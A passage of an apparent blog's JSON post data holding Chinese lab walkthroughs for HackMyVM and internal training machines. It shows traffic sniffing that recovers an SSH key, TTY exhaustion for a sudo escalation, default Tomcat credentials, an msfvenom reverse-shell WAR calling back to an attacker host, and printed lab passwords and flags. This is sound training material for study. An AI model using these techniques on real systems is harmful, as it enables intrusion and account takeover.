192.168.11.255:1337\n...\n```\n\n\u65e5\u5fd7\u663e\u793a\uff0c\u7cfb\u7edf\u6b63\u5728\u5411 `192.168.11.255` \u7684 1337 \u7aef\u53e3\u8fdb\u884c UDP \u5e7f\u64ad\u3002\n\n## 3.2 \u6d41\u91cf\u76d1\u542c\u4e0e\u51ed\u636e\u83b7\u53d6\n\n\u6839\u636e\u65e5\u5fd7\u6587\u4ef6\u7684\u7ebf\u7d22\uff0c\u5728 Kali \u4e0a\u4f7f\u7528 `tcpdump` \u76d1\u542c\u6765\u81ea\u76ee\u6807\u4e3b\u673a\u7684\u6d41\u91cf\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo tcpdump -A host 192.168.205.157\n...\nE..@..@.@. ............9.,V<LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXNmYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEhpRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQUFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K\n```\n\n\u6355\u83b7\u5230\u4e86\u4e00\u6bb5 Base64 \u7f16\u7801\u7684\u6570\u636e\u3002\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a SSH \u79c1\u94a5\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo '...' | base64 -d > /tmp/id_rsa\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat /tmp/id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\n```\n\n\u4fdd\u5b58\u79c1\u94a5\u5e76\u8d4b\u4e88 `600` \u6743\u9650\u3002\u901a\u8fc7 `ssh-keygen` \u67e5\u770b\u5176\u5173\u8054\u7528\u6237\uff0c\u53d1\u73b0\u662f `root@thefinals.hmv`\u3002\u7136\u800c\uff0c\u5c1d\u8bd5\u4f7f\u7528\u8be5\u79c1\u94a5\u4ee5 `root` \u8eab\u4efd\u767b\u5f55\u5931\u8d25\u3002\u8fdb\u4e00\u6b65\u5c1d\u8bd5\u4ee5 `scotty` \u7528\u6237\u8eab\u4efd\u767b\u5f55\uff0c\u6210\u529f\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ chmod 600 /tmp/id_rsa\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh scotty@192.168.205.157 -i /tmp/id_rsa\n\nthefinals:~$ id\nuid=1002(scotty) gid=100(users) groups=100(users),100(users)\n```\n\n\u6210\u529f\u6a2a\u5411\u79fb\u52a8\u5230 `scotty` \u7528\u6237\u3002\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n## 4.1 Sudo \u6743\u9650\u5206\u6790\n\n\u4ee5 `scotty` \u7528\u6237\u8eab\u4efd\u767b\u5f55\u540e\uff0c\u7acb\u5373\u68c0\u67e5 `sudo` \u6743\u9650\u3002\n\n```bash\nthefinals:~$ sudo -l\n...\nUser scotty may run the following commands on thefinals:\n    (ALL) NOPASSWD: /sbin/secret\n```\n\n`scotty` \u7528\u6237\u53ef\u4ee5\u65e0\u9700\u5bc6\u7801\u4ee5 `root` \u6743\u9650\u6267\u884c `/sbin/secret`\u3002\u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u8be5\u547d\u4ee4\u3002\n\n```bash\nthefinals:~$ sudo /sbin/secret\n/sbin/secret: line 2: can't create /dev/pts/99: Permission denied\n```\n\n\u7a0b\u5e8f\u6267\u884c\u5931\u8d25\uff0c\u9519\u8bef\u4fe1\u606f\u8868\u660e\u5b83\u5c1d\u8bd5\u5411 `/dev/pts/99` \u8fd9\u4e2a\u4f2a\u7ec8\u7aef\uff08TTY\uff09\u8bbe\u5907\u6587\u4ef6\u5199\u5165\u5185\u5bb9\u65f6\u6743\u9650\u4e0d\u8db3\u3002\u8fd9\u63ed\u793a\u4e86\u63d0\u6743\u7684\u5173\u952e\uff1a\u6211\u4eec\u9700\u8981\u8ba9\u81ea\u5df1\u8fdb\u5165 `/dev/pts/99` \u8fd9\u4e2a TTY \u4f1a\u8bdd\u3002\n\n## 4.2 TTY \u5360\u7528\u4e0e\u63d0\u6743\n\n\u7cfb\u7edf\u5206\u914d TTY \u7f16\u53f7\u662f\u987a\u5e8f\u7684\u3002\u4e3a\u4e86\u83b7\u5f97 `/dev/pts/99`\uff0c\u6211\u4eec\u9700\u8981\u5148\u521b\u5efa\u5e76\u5360\u7528\u6389\u4ece 0 \u5230 98 \u7684\u6240\u6709 TTY\u3002\n\n\u7531\u4e8e\u76ee\u6807\u7cfb\u7edf\u4e0a\u6ca1\u6709\u5b89\u88c5 `screen` \u6216 `tmux` \u7b49\u5de5\u5177\uff0c\u6211\u4eec\u9009\u62e9\u4f7f\u7528 `python` \u7684 `pty` \u6a21\u5757\u6765\u751f\u6210\u65b0\u7684 TTY \u4f1a\u8bdd\u3002\n\n1. **\u6279\u91cf\u521b\u5efa\u540e\u53f0 TTY**\uff1a\n   \u7f16\u5199\u4e00\u4e2a `while` \u5faa\u73af\uff0c\u5728\u540e\u53f0\u542f\u52a8 9* \u4e2a\u65b0\u7684 TTY \u4f1a\u8bdd\uff0c\u4ee5\u5360\u7528 `/dev/pts/0` \u5230 `/dev/pts/9*`\uff08\u8fd9\u91cc\u5c31\u5230\u4e00\u4e2a\u5927\u6982\u8303\u56f4\uff0c\u7136\u540e\u67e5\u770btty\u81ea\u5df1\u5fae\u8c03\u523098\u5c31\u597d\u4e86\uff09\u3002\n\n   ```bash\n   thefinals:~$ i=0; while [ $i -lt 95 ]; do python -c 'import pty; pty.spawn('/bin/ash')' & i=$((i+1)); done\n   ```\n\n*ps:\u6211\u8fd9\u80af\u5b9a\u662f\u6ca1\u523098\u7684\uff0c\u81ea\u5df1\u67e5\u770btty\u8fdb\u884c\u8c03\u6574*\n\n1. **\u521b\u5efa\u76ee\u6807 TTY**\uff1a\n   \u73b0\u5728\uff0c\u518d\u521b\u5efa\u4e00\u4e2a**\u524d\u53f0**\u7684 TTY \u4f1a\u8bdd\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5c06\u88ab\u5206\u914d\u5230\u7f16\u53f7 `/dev/pts/98`\u3002\n\n   ```bash\n   thefinals:~$ python -c 'import pty; pty.spawn('/bin/ash')'\n   ~ $ tty\n   /dev/pts/98\n   ```\n\n   (\u8fd9\u91cc\u53d1\u73b0\u9700\u898199\u4e2a\u4f1a\u8bdd\uff0c\u4e0d\u662f98\u4e2a\uff0c\u6545\u518d\u8865\u4e0a)\n\n2. **\u83b7\u53d6\u51ed\u636e**\uff1a\n   \u5728 `/dev/pts/98` (\u5b9e\u9645\u4e3a `/dev/pts/99`\uff0c\u56e0\u4e3a\u4ece0\u5f00\u59cb) \u7684 TTY \u4e2d\uff0c\u518d\u6b21\u6267\u884c `sudo` \u547d\u4ee4\u3002\n\n   ```bash\n   ~ $ sudo /sbin/secret\n   root:p8RuoQGTtlKLAjuF1Tpy5wX\n   ```\n\n   \u8fd9\u6b21\u547d\u4ee4\u6210\u529f\u6267\u884c\uff0c\u5e76\u8f93\u51fa\u4e86\u4e00\u5bf9\u51ed\u636e\u3002\u8fd9\u770b\u8d77\u6765\u50cf\u662f\u6570\u636e\u5e93\u7684 root \u7528\u6237\u5bc6\u7801\u3002\n\n## 4.3 \u83b7\u53d6\u6700\u7ec8 Root \u6743\u9650\n\n\u4f7f\u7528\u4e0a\u4e00\u6b65\u83b7\u53d6\u7684\u5bc6\u7801\u5c1d\u8bd5\u8fde\u63a5\u672c\u5730 MySQL/MariaDB \u670d\u52a1\u3002\n\n```bash\n~ $ mysql -u root -pp8RuoQGTtlKLAjuF1Tpy5wX secret -e 'select * from user;'\n...\n+----+----------+-------------------------+\n| id | username | password                |\n+----+----------+-------------------------+\n|  1 | root     | BvIpFDyB4kNbkyqJGwMzLcK |\n+----+----------+-------------------------+\n```\n\n\u5728 `secret` \u6570\u636e\u5e93\u7684 `user` \u8868\u4e2d\uff0c\u53d1\u73b0\u4e86 `root` \u7528\u6237\u7684\u5bc6\u7801 `BvIpFDyB4kNbkyqJGwMzLcK`\u3002\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u5207\u6362\u5230 `root` \u7528\u6237\u3002\n\n```bash\n~ $ su -\nPassword: BvIpFDyB4kNbkyqJGwMzLcK\nthefinals:~# id\nuid=0(root) gid=0(root) groups=0(root),...\n```\n\n\u6210\u529f\u5207\u6362\u5230 `root` \u7528\u6237\u3002\u6700\u540e\uff0c\u8bfb\u53d6\u4f4d\u4e8e `/root/root.flag` \u548c `/home/june/user.flag` \u7684\u4e24\u4e2a flag \u6587\u4ef6\uff0c\u5b8c\u6210\u6311\u6218\u3002\n\n```bash\nthefinals:~# cat /root/root.flag\nflag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}\n\nthefinals:~# cat /home/june/user.flag\nflag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}\n```sentence", "top": 0, "createdAt": 1756049398, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-24", "dateLabelColor": "#0969da"}, "P234": {"htmlDir": "docs/post/nei-bu-_Cat.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Cat", "postUrl": "post/nei-bu-_Cat.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/234", "commentNum": 0, "wordCount": 5766, "description": "### **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n\u9996\u5148\uff0c\u6211\u4eec\u5bf9\u76ee\u6807\u7f51\u6bb5\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u4ee5\u786e\u5b9a\u76ee\u6807\u673a\u5668\u7684IP\u5730\u5740\u3002\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528`arp-scan`\u5de5\u5177\u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u5bfb\u627e\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.149 08:00:27:5a:8c:5a       PCS Systemtechnik GmbH\n...\n```\n\n\u4ece\u626b\u63cf\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u8bc6\u522b\u51fa\u76ee\u6807\u4e3b\u673a\u7684IP\u5730\u5740\u4e3a `192.168.205.149`\u3002\n\n## 2. \u7aef\u53e3\u626b\u63cf\n\n\u786e\u8ba4\u76ee\u6807IP\u540e\uff0c\u4f7f\u7528`nmap`\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u4ee5\u63a2\u6d4b\u5176\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p0-65535 192.168.205.149\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 05:40 EDT\nNmap scan report for 192.168.205.149\nHost is up (0.00012s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\nMAC Address: 08:00:27:5A:8C:5A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.23 seconds\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u76ee\u6807\u4e3b\u673a\u5f00\u653e\u4e86\u4e09\u4e2a\u7aef\u53e3\uff1a\n\n*   **22/tcp**: SSH\u670d\u52a1\uff0c\u7528\u4e8e\u8fdc\u7a0b\u767b\u5f55\u3002\n*   **80/tcp**: HTTP\u670d\u52a1\uff0c\u4e00\u4e2aWeb\u670d\u52a1\u5668\u3002\n*   **8080/tcp**: HTTP-Proxy\u670d\u52a1\uff0c\u901a\u5e38\u4e5f\u662fWeb\u670d\u52a1\uff0c\u53ef\u80fd\u662fTomcat\u6216\u7c7b\u4f3c\u7684Java\u5e94\u7528\u670d\u52a1\u5668\u3002\n\n# **\u4e8c\u3001Web\u6e17\u900f**\n\n\u6211\u4eec\u4eceWeb\u670d\u52a1\u5f00\u59cb\u8fdb\u884c\u6e17\u900f\u3002\n\n## 1. 80\u7aef\u53e3 - Apache\u670d\u52a1\n\n\u8bbf\u95ee `http://192.168.205.149`\uff0c\u53d1\u73b0\u662f\u4e00\u4e2a\u7eaf\u9759\u6001\u7684\u732b\u54aa\u52a8\u753b\u9875\u9762\uff0c\u6ca1\u6709\u53ef\u4ea4\u4e92\u7684\u529f\u80fd\u70b9\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u5c1d\u8bd5\u53d1\u73b0\u9690\u85cf\u7684\u8def\u5f84\u6216\u6587\u4ef6\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ dirsearch -u http://192.168.205.149\n...\n[05:41:20] 200 -    0B  - /config.php\n[05:41:21] 200 -    0B  - /database.php\n[05:41:32] 200 -    0B  - /upload.php\n[05:41:32] 301 -  320B  - /uploads  ->  http://192.168.205.149/uploads/\n[05:41:32] 200 -  408B  - /uploads/\n...\n```\n\n\u76ee\u5f55\u7206\u7834\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684PHP\u6587\u4ef6\uff0c\u5982`config.php`\u3001`database.php`\u548c`upload.php`\uff0c\u4f46\u5b83\u4eec\u7684\u5927\u5c0f\u90fd\u4e3a0\u5b57\u8282\uff0c\u8868\u660e\u662f\u7a7a\u6587\u4ef6\u3002`/uploads/`\u76ee\u5f55\u867d\u7136\u5b58\u5728\uff0c\u4f46\u5176\u4e2d\u6ca1\u6709\u4efb\u4f55\u5185\u5bb9\u300280\u7aef\u53e3\u7684\u6e17\u900f\u4f3c\u4e4e\u9677\u5165\u50f5\u5c40\u3002\n\n## 2. 8080\u7aef\u53e3 - Tomcat\u670d\u52a1\n\n\u63a5\u7740\uff0c\u6211\u4eec\u8bbf\u95ee `http://192.168.205.149:8080`\uff0c\u9875\u9762\u663e\u793a\u8fd9\u662f`Tomcat/10.1.20`\u7684\u7ba1\u7406\u754c\u9762\u3002Tomcat\u7684\u7ba1\u7406\u540e\u53f0\u5e38\u5e38\u5b58\u5728\u5f31\u53e3\u4ee4\u6f0f\u6d1e\uff0c\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u5e38\u89c1\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\u3002\n\n**\u5f31\u53e3\u4ee4\u5c1d\u8bd5:**\n\n*   `admin`\n*   `manager`\n*   `tomcat`\n*   ...\n\n\u6700\u7ec8\uff0c\u5728\u8bbf\u95ee `http://192.168.205.149:8080/manager` \u65f6\uff0c\u4f7f\u7528 `admin:tomcat` \u6210\u529f\u767b\u5f55\u5230Tomcat Web\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u5668\u3002\n\n## 3. \u83b7\u53d6WebShell\n\n\u6210\u529f\u767b\u5f55\u540e\u53f0\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72WAR\u6587\u4ef6\u6765\u83b7\u53d6\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u3002\n\n\u9996\u5148\uff0c\u4f7f\u7528`msfvenom`\u751f\u6210\u4e00\u4e2aJava\u7684\u53cd\u5411shell payload\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f war -o shell.war\nPayload size: 1090 bytes\nFinal size of war file: 1090 bytes\nSaved as: shell.war\n```\n\n\u63a5\u7740\uff0c\u5728Tomcat\u540e\u53f0\u7684 'WAR file to deploy' \u5904\u4e0a\u4f20\u6211\u4eec\u751f\u6210\u7684`shell.war`\u6587\u4ef6\u5e76\u90e8\u7f72\u3002\n\n![image-20250823174407373](http://7r1UMPHK.github.io/image/20250825140722701.webp)\n\n\u540c\u65f6\uff0c\u5728Kali\u4e0a\u4f7f\u7528`netcat`\u5f00\u542f\u76d1\u542c\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n\u90e8\u7f72\u6210\u529f\u540e\uff0c\u70b9\u51fb\u65b0\u5e94\u7528\u7a0b\u5e8f\u7684\u8def\u5f84\uff08\u4f8b\u5982 `/shell`\uff09\u6765\u89e6\u53d1payload\u3002\n\n```shell\nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 43420\nid\nuid=1001(tomcat) gid=998(tomcat) groups=998(tomcat)\n```\n\n\u6210\u529f\u63a5\u6536\u5230\u53cd\u5f39shell\uff0c\u5f53\u524d\u7528\u6237\u4e3a`tomcat`\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u6211\u4eec\u9996\u5148\u5bf9\u83b7\u53d6\u7684\u975e\u4ea4\u4e92\u5f0fshell\u8fdb\u884c\u7a33\u5b9a\u5316\u5904\u7406\u3002\n\n```shell\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 36 columns 178\n```\n\n## 1. tomcat -> catcatcat\n\n\u5728\u76ee\u6807\u7cfb\u7edf\u4e2d\u8fdb\u884c\u4fe1\u606f\u641c\u96c6\uff0c\u5bfb\u627e\u53ef\u5229\u7528\u7684\u63d0\u6743\u7ebf\u7d22\u3002\u901a\u8fc7\u67e5\u627e\u8fd1\u671f\u88ab\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\uff0c\u53d1\u73b0\u4e86\u4e24\u4e2a\u53ef\u7591\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\n\n```bash\n/usr/local/bin/catcatcat      2025-08-02   -rwxr-xr-x        16808\n/usr/bin/imgcat               2025-08-02   -rwxr-xr-x       642040\n```\n\n`imgcat` \u662f\u4e00\u4e2a\u5728\u7ec8\u7aef\u663e\u793a\u56fe\u7247\u7684\u5de5\u5177\u3002\u6211\u4eec\u91cd\u70b9\u5173\u6ce8`catcatcat`\u8fd9\u4e2a\u81ea\u5b9a\u4e49\u547d\u4ee4\u3002\u4f7f\u7528`strings`\u547d\u4ee4\u68c0\u67e5\u8be5\u6587\u4ef6\uff0c\u53d1\u73b0\u786c\u7f16\u7801\u7684\u5bc6\u7801\u5b57\u7b26\u4e32\u3002\n\n```shell\ntomcat@Cat:/tmp$ strings /usr/local/bin/catcatcat\n...\npassword:this_is_cat_passwd\n...\n```\n\n\u63a5\u4e0b\u6765\uff0c\u67e5\u770b`/etc/passwd`\u6587\u4ef6\uff0c\u5bfb\u627e\u53ef\u80fd\u4e0e\u6b64\u5bc6\u7801\u5bf9\u5e94\u7684\u7528\u6237\u3002\n\n```shell\ntomcat@Cat:/tmp$ cat /etc/passwd|grep bash\nroot:x:0:0:root:/root:/bin/bash\ncatcatcat:x:1000:1000:,,,:/home/catcatcat:/bin/bash\ndog:x:1002:1001:,,,:/home/dog:/bin/bash\n```\n\n\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a`catcatcat`\u7684\u7528\u6237\u3002\u4f7f\u7528\u8be5\u7528\u6237\u540d\u548c\u627e\u5230\u7684\u5bc6\u7801`this_is_cat_passwd`\u901a\u8fc7SSH\u8fdb\u884c\u767b\u5f55\u3002\uff08su\u5207\u6362\u4e0d\u4e86\uff0c\u53ea\u53ef\u4ee5\u4f7f\u7528ssh\uff09\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh catcatcat@192.168.205.149\ncatcatcat@192.168.205.149's password:\n...\ncatcatcat@Cat:~$ id\nuid=1000(catcatcat) gid=1000(catcatcat) groups=1000(catcatcat)\n```\n\n\u6210\u529f\u5207\u6362\u5230`catcatcat`\u7528\u6237\u3002\n\n## 2. catcatcat -> root\n\n\u767b\u5f55\u540e\uff0c\u68c0\u67e5`catcatcat`\u7528\u6237\u7684`sudo`\u6743\u9650\u3002\n\n```shell\ncatcatcat@Cat:~$ sudo -l\nMatching Defaults entries for catcatcat on Cat:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser catcatcat may run the following commands on Cat:\n    (ALL) NOPASSWD: /usr/bin/imgcat\n```\n\n\u7ed3\u679c\u8868\u660e\uff0c`catcatcat`\u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u7801\u4ee5root\u6743\u9650\u6267\u884c`/usr/bin/imgcat`\u547d\u4ee4\u3002\u8fd9\u901a\u5e38\u662f\u4e00\u4e2a\u63d0\u6743\u7684\u7a81\u7834\u53e3\uff0c\u4f46\u8fd9\u91cc\u662f\u4e00\u4e2a\u5154\u5b50\u6d1e\uff08\u6700\u8fd1Sublarge\u5f88\u559c\u6b22\u51fa\u8fd9\u79cd\u5154\u5b50\u6d1e\u554a\uff09\u3002\n\n\u5728`catcatcat`\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e0b\uff0c\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a`cat.jpg`\u7684\u56fe\u7247\u6587\u4ef6\u3002\n\n```shell\ncatcatcat@Cat:~$ ls -al\n...\n-rw-r--r-- 1 catcatcat catcatcat 4460980 Aug  2 09:50 cat.jpg\n-rw-r--r-- 1 catcatcat catcatcat      44 Aug  2 09:18 user.txt\n...\n```\n\n\u6211\u4eec\u5c06\u6b64\u56fe\u7247\u6587\u4ef6\u901a\u8fc7`scp`\u4f20\u56deKali\u8fdb\u884c\u5206\u6790\u3002\n\n```shell\ncatcatcat@Cat:~$ scp cat.jpg kali@192.168.205.128:/mnt/hgfs/gx/x/tmp\n...\ncat.jpg                                       100% 4356KB  92.5MB/s   00:00\n```\n\n\u4f7f\u7528\u9690\u5199\u672f\u5206\u6790\u5de5\u5177`stegseek`\u5bf9\u56fe\u7247\u8fdb\u884c\u5206\u6790\uff0c\u5c1d\u8bd5\u63d0\u53d6\u9690\u85cf\u4fe1\u606f\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ stegseek cat.jpg\nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: ''\n[i] Original filename: 'id_rsa'.\n[i] Extracting to 'cat.jpg.out'.\n```\n\n`stegseek`\u6210\u529f\u5728\u65e0\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u63d0\u53d6\u51fa\u4e86\u4e00\u4e2a\u540d\u4e3a`id_rsa`\u7684\u6587\u4ef6\uff0c\u8fd9\u901a\u5e38\u662fSSH\u79c1\u94a5\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ head -n 1 cat.jpg.out\n-----BEGIN OPENSSH PRIVATE KEY-----\n```\n\n\u786e\u8ba4\u662f\u79c1\u94a5\u6587\u4ef6\u540e\uff0c\u6211\u4eec\u7528\u5b83\u6765\u5c1d\u8bd5\u4ee5root\u8eab\u4efd\u767b\u5f55\u76ee\u6807\u4e3b\u673a\u3002\n\n\u9996\u5148\uff0c\u8d4b\u4e88\u79c1\u94a5\u6b63\u786e\u7684\u6743\u9650\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ mv cat.jpg.out /tmp/id_rsa\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ chmod 600 id_rsa\n```\n\n\u7136\u540e\uff0c\u4f7f\u7528\u8be5\u79c1\u94a5\u901a\u8fc7SSH\u8fde\u63a5\u5230\u76ee\u6807\u3002\n\n```shell\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ ssh root@192.168.205.149 -i /tmp/id_rsa\n...\nLast login: Sat Aug 23 05:35:10 2025 from 192.168.205.128\nroot@Cat:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u83b7\u53d6root\u6743\u9650\u3002\n\n# **\u56db\u3001\u593a\u53d6Flag**\n\n\u6700\u540e\uff0c\u5728\u5bf9\u5e94\u7684\u76ee\u5f55\u4e0b\u8bfb\u53d6user\u548croot\u7684flag\u3002\n\n```shell\nroot@Cat:~# cat /root/root.txt /home/catcatcat/user.txt\nflag{root-471e997ce8c23ad558c2935b88814ab3}\nflag{user-081d683d33dde135a273b484ee70123b}\n```\n\n\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1756102016, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-25", "dateLabelColor": "#0969da"}, "P235": {"htmlDir": "docs/post/hmv_DC1.html", "labels": ["HackMyVM"], "postTitle": "hmv_DC1", "postUrl": "post/hmv_DC1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/235", "commentNum": 0, "wordCount": 9118, "description": "# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1.1 \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u626b\u63cf\u5c40\u57df\u7f51\u5185\u7684\u4e3b\u673a\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.131 08:00:27:cb:f9:29       PCS Systemtechnik GmbH\n...\n```\n\n\u53d1\u73b0\u76ee\u6807\u4e3b\u673a\uff1a`192.168.205.131`\n\n## 1.2 \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `rustscan` \u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ rustscan -a 192.168.205.131\n...\nOpen 192.168.205.131:53\nOpen 192.168.205.131:88\nOpen 192.168.205.131:135\nOpen 192.168.205.131:139\nOpen 192.168.205.131:389\nOpen 192.168.205.131:445\nOpen 192.168.205.131:464\nOpen 192.168.205.131:593\nOpen 192.168.205.131:636\nOpen 192.168.205.131:3268\nOpen 192.168.205.131:3269\nOpen 192.168.205.131:5985\nOpen 192.168.205.131:9389\n```\n\n\u6839\u636e\u5f00\u653e\u7684\u7aef\u53e3\u7279\u5f81\uff0853/DNS\u300188/Kerberos\u3001389/LDAP\u3001445/SMB\u7b49\uff09\uff0c\u53ef\u4ee5\u5224\u65ad\u8fd9\u662f\u4e00\u53f0\u6807\u51c6\u7684\u57df\u63a7\u5236\u5668\u3002\n\n## 1.3 \u65f6\u95f4\u540c\u6b65\n\n\u7531\u4e8e\u662f\u57df\u73af\u5883\uff0c\u9700\u8981\u4e0e\u57df\u63a7\u5236\u5668\u540c\u6b65\u65f6\u95f4\u4ee5\u907f\u514dKerberos\u8ba4\u8bc1\u95ee\u9898\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo ntpdate soupedecode.local\n2025-08-30 18:20:22.204692 (-0400) +10958.045293 +/- 0.000301 soupedecode.local 192.168.205.131 s1 no-leap\nCLOCK: time stepped by 10958.045293\n```\n\n# \u4e8c\u3001\u6f0f\u6d1e\u626b\u63cf\n\n## 2.1 